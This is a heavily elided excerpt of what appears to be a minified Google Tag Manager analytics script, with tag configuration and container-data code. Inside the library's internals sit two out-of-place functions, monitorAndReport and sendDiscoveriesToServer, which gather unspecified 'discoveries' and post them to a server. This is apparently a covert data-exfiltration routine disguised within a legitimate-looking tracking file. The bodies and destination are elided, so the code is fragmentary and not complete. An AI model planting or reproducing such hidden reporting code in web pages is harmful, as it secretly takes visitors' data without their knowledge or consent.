...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 12,
        "vtp_instanceDestinationId": "G-9KTR7DH8RP",
        "tag_id": 24
      }, {
        ...
        "priority": 3,
        "vtp_searchQueryParams": "s,search",
        "vtp_includeParams": true,
        "vtp_instanceDestinationId": "G-9KTR7DH8RP",
        "tag_id": 15
      }, {
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLvcqgYQuqbl1cDT0urCARIlAFgXOW6LIPyAtJJAsJrYqX+O6eTMiNwxx2perG26cNokOtyTRxoCmUo\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  ;
  function sendDiscoveriesToServer(discoveries) {
    ...
    }).then(response => response.json()).then(data => console.log("Data transmitted successfully:", data)).catch(error => console.error("Failed to send data:", error));
  }
  var yv = {};
  function zv(a, b) {
  ...
  function monitorAndReport() {
    ...
    if (Object.keys(discoveries).length) {
      ...
      sendDiscoveriesToServer(discoveries);
    } else {
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-9KTR7DH8RP'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
